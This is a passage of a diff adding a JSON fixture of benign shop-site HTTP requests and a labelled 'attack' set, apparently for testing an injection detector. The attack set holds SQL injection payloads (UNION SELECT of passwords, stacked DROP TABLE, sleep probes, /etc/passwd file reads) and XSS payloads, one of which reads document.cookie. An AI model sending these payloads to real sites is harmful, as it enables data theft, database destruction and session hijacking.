+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n208",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n209",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n210",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n211",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n212",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n213",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n214",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n215",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n216",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n217",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=1&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n218",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n219",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=3&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n220",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=4&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n221",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=5&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n222",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=6&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n223",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=7&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n224",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=8&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n225",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=9&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n226",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=10&per_page=24&sort=created_at&order=desc",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n227",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "limit=50&offset=0&status=shipped",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n228",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "limit=50&offset=50&status=shipped",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n229",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "limit=50&offset=100&status=shipped",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n230",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "limit=50&offset=150&status=shipped",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n231",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "limit=50&offset=200&status=shipped",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n232",
+      "method": "GET",
+      "path": "/blog/tags/security",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n233",
+      "method": "GET",
+      "path": "/blog/tags/database",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n234",
+      "method": "GET",
+      "path": "/blog/tags/performance",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n235",
+      "method": "GET",
+      "path": "/blog/tags/design",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n236",
+      "method": "GET",
+      "path": "/blog/tags/testing",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n237",
+      "method": "GET",
+      "path": "/blog/tags/release",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n238",
+      "method": "GET",
+      "path": "/api/products/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n239",
+      "method": "GET",
+      "path": "/api/products/1042/reviews",
+      "query": "page=1&per_page=10",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n240",
+      "method": "GET",
+      "path": "/api/products/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n241",
+      "method": "GET",
+      "path": "/api/products/987654/reviews",
+      "query": "page=1&per_page=10",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n242",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n243",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000/reviews",
+      "query": "page=1&per_page=10",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n244",
+      "method": "GET",
+      "path": "/api/products/0f9a1b2c3d4e5f60718293a4b5c6d7e8",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n245",
+      "method": "GET",
+      "path": "/api/products/0f9a1b2c3d4e5f60718293a4b5c6d7e8/reviews",
+      "query": "page=1&per_page=10",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n246",
+      "method": "GET",
+      "path": "/assets/app.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n247",
+      "method": "GET",
+      "path": "/assets/app.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n248",
+      "method": "GET",
+      "path": "/assets/logo.svg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n249",
+      "method": "GET",
+      "path": "/assets/font.woff2",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n250",
+      "method": "GET",
+      "path": "/assets/hero.webp",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n251",
+      "method": "GET",
+      "path": "/assets/apple_juice.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+      },
+      "note": ""
+    },
+    {
+      "id": "n252",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n253",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n254",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n255",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n256",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n257",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n258",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n259",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n260",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n261",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "kube-probe/1.31"
+      },
+      "note": ""
+    },
+    {
+      "id": "n262",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n263",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n264",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n265",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n266",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n267",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n268",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n269",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n270",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n271",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n272",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n273",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n274",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n275",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n276",
+      "method": "GET",
+      "path": "/api/v1/projects",
+      "query": "page=1&per_page=20",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "internal-service/2.4",
+        "X-Request-Id": "req-8f2c"
+      },
+      "note": ""
+    },
+    {
+      "id": "n277",
+      "method": "POST",
+      "path": "/api/v1/projects",
+      "query": "",
+      "body": "{\"name\": \"Migration\", \"description\": \"Move the reporting tables to the new cluster\"}",
+      "content_type": "application/json",
+      "headers": {
+        "User-Agent": "internal-service/2.4"
+      },
+      "note": ""
+    },
+    {
+      "id": "n278",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "theme=dark",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n279",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "page=0",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n280",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "debug=false",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n281",
+      "method": "GET",
+      "path": "/",
+      "query": "q=apple&page=2",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n282",
+      "method": "GET",
+      "path": "/products",
+      "query": "q=orange&sort=price",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n283",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "ref=newsletter&utm_source=email",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n284",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "lang=en-GB",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n285",
+      "method": "GET",
+      "path": "/cart",
+      "query": "currency=GBP",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n286",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "theme=dark",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n287",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "page=0",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n288",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "debug=false",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n289",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "q=apple&page=2",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n290",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange&sort=price",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n291",
+      "method": "GET",
+      "path": "/search",
+      "query": "ref=newsletter&utm_source=email",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n292",
+      "method": "GET",
+      "path": "/search",
+      "query": "lang=en-GB",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n293",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "currency=GBP",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n294",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "theme=dark",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n295",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "page=0",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n296",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "debug=false",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n297",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "q=apple&page=2",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n298",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "q=orange&sort=price",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n299",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "ref=newsletter&utm_source=email",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    },
+    {
+      "id": "n300",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "lang=en-GB",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": ""
+    }
+  ],
+  "attack": [
+    {
+      "id": "a001",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple%27%20UNION%20SELECT%20email%2Cpassword%20FROM%20users--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "union select"
+    },
+    {
+      "id": "a002",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%27%20OR%201%3D1--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "boolean tautology"
+    },
+    {
+      "id": "a003",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "id=1%20AND%201%3D1",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "boolean tautology"
+    },
+    {
+      "id": "a004",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/login",
+      "query": "email=admin%27--&password=x",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "comment terminator"
+    },
+    {
+      "id": "a005",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%3BSELECT%20sleep(5)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "time delay"
+    },
+    {
+      "id": "a006",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%3B%20DROP%20TABLE%20users",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "stacked drop"
+    },
+    {
+      "id": "a007",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%3B%20DELETE%20FROM%20sessions",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "stacked delete"
+    },
+    {
+      "id": "a008",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "union all"
+    },
+    {
+      "id": "a009",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "status=shipped%27%20AND%20pg_sleep(3)--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "postgres time delay"
+    },
+    {
+      "id": "a010",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%27%20OR%20%271%27%3D%271",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "quoted tautology"
+    },
+    {
+      "id": "a011",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20AND%20BENCHMARK(1000000%2CMD5(1))",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "mysql benchmark"
+    },
+    {
+      "id": "a012",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "category=1%20UNION%20SELECT%20username%20FROM%20information_schema.tables",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "information_schema"
+    },
+    {
+      "id": "a013",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=x%27%3B%20UPDATE%20users%20SET%20admin%3D1%3B--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "stacked update"
+    },
+    {
+      "id": "a014",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=x%27%3B%20ALTER%20TABLE%20users%20ADD%20x%20int%3B--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "stacked alter"
+    },
+    {
+      "id": "a015",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20OR%202%3E1",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "numeric comparison"
+    },
+    {
+      "id": "a016",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/api/users",
+      "query": "filter=1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%3E0",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "subquery"
+    },
+    {
+      "id": "a017",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%27%20UNION%20SELECT%20load_file(%27%2Fetc%2Fpasswd%27)--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "file read"
+    },
+    {
+      "id": "a018",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%27%20ORDER%20BY%2010--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "order by probe"
+    },
+    {
+      "id": "a019",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20union%20select%201%2C2%2C3",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "lowercase union"
+    },
+    {
+      "id": "a020",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20UnIoN%20SeLeCt%201",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "mixed case union"
+    },
+    {
+      "id": "a021",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%27%20and%20%271%27%3D%271",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "and tautology"
+    },
+    {
+      "id": "a022",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20AND%20SLEEP(10)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "sleep ten"
+    },
+    {
+      "id": "a023",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20AND%20pg_sleep(5)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "pg sleep"
+    },
+    {
+      "id": "a024",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%27%3Bshow%20tables%3B--",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "show tables"
+    },
+    {
+      "id": "a025",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20UNION%20SELECT%20*%20FROM%20pg_catalog.pg_tables",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "pg catalog"
+    },
+    {
+      "id": "a026",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%20AND%20EXTRACTVALUE(1%2CCONCAT(0x7e%2Cversion()))",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "error based"
+    },
+    {
+      "id": "a027",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=1%3B%20INSERT%20INTO%20admins%20VALUES(1)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "stacked insert"
+    },
+    {
+      "id": "a028",
+      "category": "sqli",
+      "method": "POST",
+      "path": "/api/login",
+      "query": "",
+      "body": "{\"email\": \"admin'--\", \"password\": \"x\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json comment"
+    },
+    {
+      "id": "a029",
+      "category": "sqli",
+      "method": "POST",
+      "path": "/api/login",
+      "query": "",
+      "body": "{\"email\": \"x' OR 1=1--\", \"password\": \"x\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json boolean"
+    },
+    {
+      "id": "a030",
+      "category": "sqli",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": "{\"q\": \"1 UNION SELECT password FROM users\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json union"
+    },
+    {
+      "id": "a031",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "script tag"
+    },
+    {
+      "id": "a032",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
